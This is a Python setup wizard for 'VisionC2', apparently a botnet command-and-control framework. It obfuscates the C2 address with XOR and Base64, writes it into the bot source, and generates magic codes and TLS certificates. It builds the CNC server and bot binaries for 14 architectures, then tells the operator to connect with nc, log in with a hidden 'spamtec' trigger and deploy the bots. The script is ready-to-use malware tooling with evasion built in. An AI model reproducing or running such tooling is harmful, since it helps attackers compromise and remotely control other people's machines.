#!/usr/bin/env python3
"""
VisionC2 - Interactive Setup Script
====================================
Automates the complete setup process:
- Generates random protocol version and magic code
- Obfuscates C2 address using XOR+Base64
- Generates TLS certificates
- Updates CNC and Bot source code
- Builds all components

Author: Syn2Much
"""

import os
import sys
import re
import random
import string
import base64
import subprocess
import shutil
from datetime import datetime


# ANSI Colors
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    """Print the setup banner"""
    clear_screen()
    banner = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}
    ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗ ██████╗██████╗ 
    ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚════██╗
    ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║██║      █████╔╝
    ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██║     ██╔═══╝ 
     ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║╚██████╗███████╗
      ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝
{Colors.RESET}
{Colors.BRIGHT_CYAN}              ═══════════════════════════════════════
                    {Colors.BRIGHT_YELLOW}Interactive Setup Wizard{Colors.BRIGHT_CYAN}
              ═══════════════════════════════════════{Colors.RESET}
"""
    print(banner)


def print_step(step_num: int, total: int, title: str):
    """Print a step header"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET} {Colors.BRIGHT_YELLOW}Step {step_num}/{total}:{Colors.RESET} {Colors.BRIGHT_WHITE}{title:<47}{Colors.RESET}{Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )


def success(msg: str):
    print(f"{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")


def error(msg: str):
    print(f"{Colors.BRIGHT_RED}[✗]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")


def info(msg: str):
    print(f"{Colors.BRIGHT_BLUE}[i]{Colors.RESET} {Colors.BLUE}{msg}{Colors.RESET}")


def warning(msg: str):
    print(f"{Colors.BRIGHT_YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")


def prompt(msg: str, default: str = None) -> str:
    """Get user input with styled prompt"""
    if default:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg} [{Colors.DIM}{default}{Colors.RESET}]: "
    else:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg}: "

    value = input(display).strip()
    return value if value else default


def confirm(msg: str, default: bool = True) -> bool:
    """Get yes/no confirmation"""
    default_str = "Y/n" if default else "y/N"
    response = (
        input(f"{Colors.BRIGHT_YELLOW}?{Colors.RESET} {msg} [{default_str}]: ")
        .strip()
        .lower()
    )

    if not response:
        return default
    return response in ["y", "yes"]


def generate_magic_code(length: int = 16) -> str:
    """Generate a random magic code with mixed characters"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return "".join(random.choice(chars) for _ in range(length))


def generate_protocol_version() -> str:
    """Generate a random protocol version"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 99)

    formats = [
        f"v{major}.{minor}",
        f"v{major}.{minor}.{patch}",
        f"proto{major}{minor}",
        f"V{major}_{minor}",
        f"r{major}.{minor}-stable",
    ]
    return random.choice(formats)


def obfuscate_c2(c2_address: str, xor_key: int = 0x55) -> str:
    """Generate XOR+Base64 obfuscated C2 address"""
    xor_bytes = bytes([ord(c) ^ xor_key for c in c2_address])
    return base64.b64encode(xor_bytes).decode()


def verify_obfuscation(encoded: str, xor_key: int = 0x55) -> str:
    """Verify the obfuscation by decoding"""
    decoded = base64.b64decode(encoded)
    decrypted = bytes([b ^ xor_key for b in decoded])
    return decrypted.decode()


def update_cnc_main_go(
    cnc_path: str, magic_code: str, protocol_version: str, admin_port: str
):
    """Update the CNC main.go file with new values"""
    main_go_path = os.path.join(cnc_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update MAGIC_CODE
    content = re.sub(
        r'MAGIC_CODE\s*=\s*"[^"]*"', f'MAGIC_CODE       = "{magic_code}"', content
    )

    # Update PROTOCOL_VERSION
    content = re.sub(
        r'PROTOCOL_VERSION\s*=\s*"[^"]*"',
        f'PROTOCOL_VERSION = "{protocol_version}"',
        content,
    )

    # Update USER_SERVER_PORT
    content = re.sub(
        r'USER_SERVER_PORT\s*=\s*"[^"]*"', f'USER_SERVER_PORT = "{admin_port}"', content
    )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def update_bot_main_go(
    bot_path: str, magic_code: str, protocol_version: str, obfuscated_c2: str
):
    """Update the Bot main.go file with new values"""
    main_go_path = os.path.join(bot_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update gothTits (obfuscated C2)
    content = re.sub(
        r'const gothTits\s*=\s*"[^"]*"', f'const gothTits = "{obfuscated_c2}"', content
    )

    # Update magicCode
    content = re.sub(
        r'magicCode\s*=\s*"[^"]*"', f'magicCode       = "{magic_code}"', content
    )

    # Update protocolVersion
    content = re.sub(
        r'protocolVersion\s*=\s*"[^"]*"',
        f'protocolVersion = "{protocol_version}"',
        content,
    )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
    """Generate TLS certificates"""
    try:
        key_path = os.path.join(cnc_path, "server.key")
        cert_path = os.path.join(cnc_path, "server.crt")

        # Generate private key
        info("Generating 4096-bit RSA private key...")
        subprocess.run(
            ["openssl", "genrsa", "-out", key_path, "4096"],
            check=True,
            capture_output=True,
        )

        # Generate certificate
        info("Generating self-signed certificate...")
        subject = f"/C={cert_config['country']}/ST={cert_config['state']}/L={cert_config['city']}/O={cert_config['org']}/CN={cert_config['cn']}"

        subprocess.run(
            [
                "openssl",
                "req",
                "-new",
                "-x509",
                "-sha256",
                "-key",
                key_path,
                "-out",
                cert_path,
                "-days",
                str(cert_config["days"]),
                "-subj",
                subject,
            ],
            check=True,
            capture_output=True,
        )

        return True
    except subprocess.CalledProcessError as e:
        error(f"Failed to generate certificates: {e}")
        return False
    except FileNotFoundError:
        error("OpenSSL not found. Please install: apt install openssl")
        return False


def build_cnc(cnc_path: str) -> bool:
    """Build the CNC server"""
    try:
        info("Building CNC server...")
        result = subprocess.run(
            ["go", "build", "-ldflags=-s -w", "-o", "cnc", "."],
            cwd=cnc_path,
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            error(f"Build failed: {result.stderr}")
            return False

        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.23+")
        return False


def build_bots(bot_path: str) -> bool:
    """Build bot binaries using build.sh"""
    try:
        build_script = os.path.join(bot_path, "build.sh")

        # Make build.sh executable
        os.chmod(build_script, 0o755)

        info("Building bot binaries for 14 architectures...")
        info("This may take a few minutes...")
        print()

        result = subprocess.run(["bash", "build.sh"], cwd=bot_path, text=True)

        return result.returncode == 0
    except Exception as e:
        error(f"Build failed: {e}")
        return False


def save_config(base_path: str, config: dict):
    """Save configuration to a file for reference"""
    config_path = os.path.join(base_path, "setup_config.txt")

    with open(config_path, "w") as f:
        f.write("=" * 60 + "\n")
        f.write("VisionC2 Configuration\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

        f.write("[C2 Server]\n")
        f.write(f"C2 Address: {config['c2_address']}\n")
        f.write(f"Admin Port: {config['admin_port']}\n")
        f.write(f"Bot Port: 443\n\n")

        f.write("[Security]\n")
        f.write(f"Magic Code: {config['magic_code']}\n")
        f.write(f"Protocol Version: {config['protocol_version']}\n")
        f.write(f"Obfuscated C2: {config['obfuscated_c2']}\n\n")

        f.write("[Certificate]\n")
        f.write(f"Country: {config['cert']['country']}\n")
        f.write(f"State: {config['cert']['state']}\n")
        f.write(f"City: {config['cert']['city']}\n")
        f.write(f"Organization: {config['cert']['org']}\n")
        f.write(f"Common Name: {config['cert']['cn']}\n")
        f.write(f"Valid Days: {config['cert']['days']}\n\n")

        f.write("[Usage]\n")
        f.write("1. Start CNC: cd cnc && ./cnc\n")
        f.write(
            f"2. Connect Admin: nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
        )
        f.write("3. Login trigger: spamtec\n")
        f.write("4. Bot binaries: bot/bins/\n")

    return config_path


def print_summary(config: dict):
    """Print final configuration summary"""
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    print(f"{Colors.BRIGHT_CYAN}╔══ Configuration Summary ══╗{Colors.RESET}")
    print(
        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['c2_address']}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['admin_port']}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Protocol Version:{Colors.RESET}  {Colors.BRIGHT_WHITE}{config['protocol_version']}{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_CYAN}╚{'═' * 28}╝{Colors.RESET}\n")

    print(f"{Colors.BRIGHT_YELLOW}╔══ Next Steps ══╗{Colors.RESET}")
    print(f"  {Colors.CYAN}1.{Colors.RESET} Start CNC server:")
    print(f"     {Colors.DIM}cd cnc && ./cnc{Colors.RESET}")
    print()
    print(f"  {Colors.CYAN}2.{Colors.RESET} Connect to admin panel:")
    print(
        f"     {Colors.DIM}nc {config['c2_address'].split(':')[0]} {config['admin_port']}{Colors.RESET}"
    )
    print(f"     {Colors.DIM}Type 'spamtec' at blank screen to login{Colors.RESET}")
    print()
    print(f"  {Colors.CYAN}3.{Colors.RESET} Deploy bot binaries from:")
    print(f"     {Colors.DIM}bot/bins/{Colors.RESET}")
    print(f"{Colors.BRIGHT_YELLOW}╚{'═' * 17}╝{Colors.RESET}\n")


def main():
    """Main setup wizard"""
    print_banner()

    # Get base path
    base_path = os.path.dirname(os.path.abspath(__file__))
    cnc_path = os.path.join(base_path, "cnc")
    bot_path = os.path.join(base_path, "bot")

    # Verify paths exist
    if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
        error("Cannot find cnc/ or bot/ directories. Run this from VisionC2 root.")
        sys.exit(1)

    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}\n")

    if not confirm("Ready to configure VisionC2?"):
        print("\nSetup cancelled.")
        sys.exit(0)

    config = {}

    # ═══════════════════════════════════════════════════════════
    # Step 1: C2 Address Configuration
    # ═══════════════════════════════════════════════════════════
    print_step(1, 5, "C2 Server Configuration")

    while True:
        c2_address = prompt("Enter C2 address (IP:PORT)", "127.0.0.1:443")

        if ":" not in c2_address:
            warning("Format should be IP:PORT (e.g., 1.2.3.4:443)")
            continue

        parts = c2_address.split(":")
        if len(parts) != 2:
            warning("Invalid format. Use IP:PORT")
            continue

        try:
            port = int(parts[1])
            if port < 1 or port > 65535:
                warning("Port must be between 1 and 65535")
                continue
        except ValueError:
            warning("Port must be a number")
            continue

        break

    config["c2_address"] = c2_address

    admin_port = prompt("Enter admin server port", "420")
    config["admin_port"] = admin_port

    success(f"C2 configured: {c2_address}")
    success(f"Admin port: {admin_port}")

    # ═══════════════════════════════════════════════════════════
    # Step 2: Security Tokens
    # ═══════════════════════════════════════════════════════════
    print_step(2, 5, "Security Token Generation")

    # Generate random values
    auto_magic = generate_magic_code(16)
    auto_protocol = generate_protocol_version()

    info(f"Auto-generated Magic Code: {Colors.BRIGHT_WHITE}{auto_magic}{Colors.RESET}")
    info(
        f"Auto-generated Protocol Version: {Colors.BRIGHT_WHITE}{auto_protocol}{Colors.RESET}"
    )
    print()

    if confirm("Use auto-generated security tokens?"):
        magic_code = auto_magic
        protocol_version = auto_protocol
    else:
        magic_code = prompt("Enter custom magic code", auto_magic)
        protocol_version = prompt("Enter custom protocol version", auto_protocol)

    config["magic_code"] = magic_code
    config["protocol_version"] = protocol_version

    # Obfuscate C2 address
    obfuscated_c2 = obfuscate_c2(c2_address)
    config["obfuscated_c2"] = obfuscated_c2

    # Verify
    verified = verify_obfuscation(obfuscated_c2)
    if verified == c2_address:
        success("C2 address obfuscation verified ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    success(f"Magic Code: {magic_code}")
    success(f"Protocol Version: {protocol_version}")

    # ═══════════════════════════════════════════════════════════
    # Step 3: TLS Certificate Configuration
    # ═══════════════════════════════════════════════════════════
    print_step(3, 5, "TLS Certificate Generation")

    info("Certificate details (press Enter for defaults):")
    print()

    cert_config = {
        "country": prompt("Country code (2 letter)", "US"),
        "state": prompt("State/Province", "California"),
        "city": prompt("City", "San Francisco"),
        "org": prompt("Organization", "Security Research"),
        "cn": prompt("Common Name (domain)", "secure.local"),
        "days": int(prompt("Valid days", "365")),
    }
    config["cert"] = cert_config

    if not generate_certificates(cnc_path, cert_config):
        error("Certificate generation failed!")
        if not confirm("Continue without new certificates?"):
            sys.exit(1)
    else:
        success("TLS certificates generated successfully")

    # ═══════════════════════════════════════════════════════════
    # Step 4: Update Source Code
    # ═══════════════════════════════════════════════════════════
    print_step(4, 5, "Updating Source Code")

    # Update CNC
    info("Updating cnc/main.go...")
    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
        success("CNC configuration updated")
    else:
        error("Failed to update CNC configuration")

    # Update Bot
    info("Updating bot/main.go...")
    if update_bot_main_go(bot_path, magic_code, protocol_version, obfuscated_c2):
        success("Bot configuration updated")
    else:
        error("Failed to update Bot configuration")

    # ═══════════════════════════════════════════════════════════
    # Step 5: Build
    # ═══════════════════════════════════════════════════════════
    print_step(5, 5, "Building Binaries")

    # Build CNC
    if confirm("Build CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built successfully")
        else:
            warning("CNC build failed - you can build manually later")

    # Build Bots
    if confirm("Build bot binaries (14 architectures)?"):
        warning("This will take several minutes...")
        if build_bots(bot_path):
            success("Bot binaries built successfully")
        else:
            warning("Bot build had issues - check bot/bins/ folder")

    # Save configuration
    config_file = save_config(base_path, config)
    info(f"Configuration saved to: {config_file}")

    # Print summary
    print_summary(config)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        sys.exit(1)
